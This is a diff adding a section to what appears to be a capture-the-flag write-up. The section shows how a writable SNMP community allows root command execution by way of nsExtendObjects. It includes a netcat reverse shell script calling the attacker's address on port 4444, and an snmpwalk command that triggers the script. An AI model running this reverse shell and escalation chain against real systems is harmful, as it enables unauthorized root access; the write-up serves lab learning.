@@ -154,3 +154,39 @@ Seems we have SNMP port running let check for conf file.
 
 ### SNMP RCE
 
+SNMP is sometimes overseen by the administrator of the device or server where it is left in a default configuration. SNMP community with write permissions (`rwcommunity`) on the Linux operating system can be abused to let the attacker execute a command on the server.
+
+
+![image](https://user-images.githubusercontent.com/69868171/144611403-f8ab2be8-65dd-49c9-8c90-0c55d2372b47.png)
+
+*Source hacktricks*
+
+### Extending The Services
+
+While you are not able to modify existing entries that were configured in `snmpd.conf`, it is possible to add additional commands over SNMP, because the `MAX-ACCESS` permission setting in the MIB definition is set to `read-create`
+
+Adding a new command basically works by appending an additional row to the `nsExtendObjects` table. Feel free tp read more here [Snmp Arbitary Command Execution And Shell](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce) Now let jump back to exploit our target.
+
+
+We need to change directory to `/tmp` to create the file `snmpd-tests.sh` that will hold our reverse shell payload;
+
+```
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.186 4444 >/tmp/f
+
+```
+
+Save in `snmpd-tests.sh` and make it executable with `chmod +x snmpd-tests.sh` and we should start our Ncat listener also before walking with SNMP.
+
+![image](https://user-images.githubusercontent.com/69868171/144613065-89d3b8a6-2a94-446b-8eed-7fa1f7caca4e.png)
+
+
+Now is the time to walk let run;
+
+```
+snmpwalk 127.0.0.1 -c public -v1 . -On
+```
+
+![image](https://user-images.githubusercontent.com/69868171/144613398-7d5b8f86-4f6e-4e4a-81f9-b517769c9f29.png)
+
+Boom we have root shell and we have walk successfully which also execute the bash file with root privillege to give us root shell.
